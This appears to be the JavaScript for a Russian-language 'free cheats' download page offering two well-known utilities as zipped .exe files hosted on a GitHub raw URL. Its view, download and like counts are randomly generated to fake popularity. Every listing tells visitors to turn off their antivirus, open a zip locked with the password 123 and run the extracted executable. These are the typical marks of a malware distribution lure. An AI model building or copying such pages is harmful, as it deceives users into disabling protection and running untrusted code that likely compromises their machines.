const cheatsRaw = [
    { name: "Everything", displayName: "Everything", banner: "https://www.voidtools.com/support/everything", icon: "https://www.chip.de/ii/1/2/6/3/4/2/6/2/3/logo-9ab6fbee042d074e.jpg", zipFile: "Everething.zip", desc_ru: "Быстрый поиск по системе", fileType: ".exe", lastUpdate: "12.05.2026" },
    { name: "Shellbag", displayName: "Shellbag", banner: "https://privazer.com/images/privazer-logo-name.jpg", icon: "https://i.ytimg.com/vi/VXwlVVG2_i0/hqdefault.jpg", zipFile: "Shellbag.zip", desc_ru: "Cмотреть удалённые файлы", fileType: ".exe", lastUpdate: "12.05.2026" },
];

function formatNumberShort(num) {
    if (num >= 1000) return (num / 1000).toFixed(1).replace(/\.0$/, '') + 'K';
    return num.toString();
}

function randomStat() {
    let views = Math.floor(Math.random() * (38000 - 16000) + 16000);
    let downloads = Math.floor(views * (Math.random() * 0.35 + 0.45));
    let likes = Math.floor(downloads * (Math.random() * 0.4 + 0.25));
    return { views, downloads, likes };
}

cheatsRaw.forEach(c => { let s = randomStat(); c.views = s.views; c.downloads = s.downloads; c.likes = s.likes; c.userRating = 0; c.ratingCount = 0; });

let likesData = JSON.parse(localStorage.getItem('aeternus_likes_data')) || {};
let ratingsData = JSON.parse(localStorage.getItem('aeternus_ratings')) || {};
cheatsRaw.forEach(c => {
    if (!likesData[c.name]) likesData[c.name] = { liked: false, count: c.likes };
    if (!ratingsData[c.name]) ratingsData[c.name] = { total: 0, count: 0 };
});
function saveLikesData() { localStorage.setItem('aeternus_likes_data', JSON.stringify(likesData)); }
function saveRatings() { localStorage.setItem('aeternus_ratings', JSON.stringify(ratingsData)); }

let downloadsMap = JSON.parse(localStorage.getItem('aeternus_downloads')) || {};
cheatsRaw.forEach(c => { if (downloadsMap[c.name] === undefined) downloadsMap[c.name] = c.downloads; });

function updateSidebarTop() {
    let sorted = [...cheatsRaw].sort((a,b) => (downloadsMap[b.name]||b.downloads) - (downloadsMap[a.name]||a.downloads));
    let top3 = sorted.slice(0,3);
    document.getElementById('top1').innerHTML = `🔥 ${top3[0].displayName} — ${formatNumberShort(downloadsMap[top3[0].name]||top3[0].downloads)}`;
    document.getElementById('top2').innerHTML = `🔥 ${top3[1].displayName} — ${formatNumberShort(downloadsMap[top3[1].name]||top3[1].downloads)}`;
    document.getElementById('top3').innerHTML = `🔥 ${top3[2].displayName} — ${formatNumberShort(downloadsMap[top3[2].name]||top3[2].downloads)}`;
}

function renderCheats(filter = '') {
    let filtered = cheatsRaw.filter(c => c.displayName.toLowerCase().includes(filter.toLowerCase()));
    const grid = document.getElementById('cheatsGrid');
    grid.innerHTML = filtered.map(c => {
        let curDown = downloadsMap[c.name] || c.downloads;
        let curLikes = likesData[c.name]?.count || c.likes;
        let isLiked = likesData[c.name]?.liked || false;
        let heartClass = isLiked ? 'fa-solid fa-heart' : 'fa-regular fa-heart';
        let rating = ratingsData[c.name] || { total: 0, count: 0 };
        let avgRating = rating.count > 0 ? (rating.total / rating.count).toFixed(1) : 0;
        let starsHtml = '';
        for (let i=1; i<=5; i++) starsHtml += `<i class="fa-${i <= Math.round(avgRating) ? 'fas' : 'far'} fa-star" data-rating="${i}"></i>`;
        return `<div class="cheat-card"><img class="card-img" src="${c.banner}" onerror="this.src='https://placehold.co/400x150?text=Aeternus'"><div class="card-content"><div class="cheat-header"><img class="cheat-icon" src="${c.icon}" onerror="this.src='https://placehold.co/40x40?text=AE'"><div class="cheat-name">${c.displayName}<span class="update-badge">📅 ${c.lastUpdate}</span></div></div><div class="stats-row"><span><i class="fas fa-eye"></i> ${formatNumberShort(c.views)}</span><span><i class="fas fa-download"></i> ${formatNumberShort(curDown)}</span><div class="stars-rating" data-cheat="${c.name}">${starsHtml}</div><button class="likes like-btn" data-cheat="${c.name}"><i class="${heartClass}"></i> <span>${formatNumberShort(curLikes)}</span></button></div><div class="cheat-description">${c.desc_ru}<div class="file-type">📦 Формат: .zip | Пароль: 123 | Перед запуском отключите антивирус. Извлеките .exe из архива на рабочий стол.</div></div><button class="btn-download" data-file="${c.zipFile}"><i class="fas fa-download"></i> Скачать Installer</button><div class="password-wrapper" data-pass="123"><span><i class="fas fa-key"></i> Пароль: 123 <span class="copy-tooltip">(нажмите, чтобы скопировать)</span></span><button class="copy-pass"><i class="fas fa-copy"></i></button></div></div></div>`;
    }).join('');
    attachEvents();
}
function attachEvents() {
    document.querySelectorAll('.like-btn').forEach(btn => {
        btn.addEventListener('click', (e) => {
            e.stopPropagation();
            const cheatName = btn.getAttribute('data-cheat');
            let data = likesData[cheatName];
            if (!data) data = { liked: false, count: 0 };
            if (data.liked) { data.liked = false; data.count--; }
            else { data.liked = true; data.count++; }
            likesData[cheatName] = data;
            saveLikesData();
            const icon = btn.querySelector('i');
            const span = btn.querySelector('span');
            if (data.liked) { icon.classList.remove('fa-regular'); icon.classList.add('fa-solid'); }
            else { icon.classList.remove('fa-solid'); icon.classList.add('fa-regular'); }
            span.innerText = formatNumberShort(data.count);
            showToast(data.liked ? `❤️ ${cheatName} +1 лайк` : `💔 Лайк убран с ${cheatName}`);
        });
    });
    document.querySelectorAll('.stars-rating').forEach(el => {
        el.querySelectorAll('i').forEach(star => {
            star.addEventListener('click', (e) => {
                e.stopPropagation();
                const cheatName = el.getAttribute('data-cheat');
                const ratingVal = parseInt(star.getAttribute('data-rating'));
                let rt = ratingsData[cheatName] || { total: 0, count: 0 };
                rt.total += ratingVal;
                rt.count++;
                ratingsData[cheatName] = rt;
                saveRatings();
                renderCheats(document.getElementById('searchInput')?.value||'');
                showToast(`⭐ Вы оценили ${cheatName} на ${ratingVal} звезд!`);
            });
        });
    });
    document.querySelectorAll('.password-wrapper').forEach(wrapper => {
        wrapper.addEventListener('click', (e) => {
            const pass = wrapper.getAttribute('data-pass');
            navigator.clipboard.writeText(pass);
            showToast('🔑 Пароль скопирован: 123');
        });
    });
    document.querySelectorAll('.btn-download').forEach(btn => {
        btn.addEventListener('click', (e) => {
            const fileName = btn.getAttribute('data-file');
            if (fileName) {
                showToast(`✅ Загрузка ${fileName} началась...`);
                window.location.href = `https://raw.githubusercontent.com/TopFreeCheats/website/main/${fileName}`;
            } else {
                showToast(`❌ Ошибка: файл не найден`);
            }
        });
    });
}

function showToast(msg) { let t=document.getElementById('toast'); t.innerText=msg; t.style.opacity='1'; t.style.visibility='visible'; setTimeout(()=>{ t.style.opacity='0'; t.style.visibility='hidden'; },2100); }

document.getElementById('supportBtn').addEventListener('click',()=>showToast("🟢 Администратор онлайн! Ответим в течение 5 минут (демо-режим)"));
document.getElementById('themeToggle').addEventListener('click',()=>{
    document.body.classList.toggle('dark-mode');
    showToast(document.body.classList.contains('dark-mode') ? '🌙 Тёмная тема включена' : '☀️ Светлая тема включена');
});
document.getElementById('searchInput').addEventListener('input',(e)=>renderCheats(e.target.value));
window.openSidebar = function() { document.getElementById('sidebar').classList.add('active'); document.getElementById('overlay').classList.add('active'); };
window.closeSidebar = function() { document.getElementById('sidebar').classList.remove('active'); document.getElementById('overlay').classList.remove('active'); };
renderCheats(); updateSidebarTop();
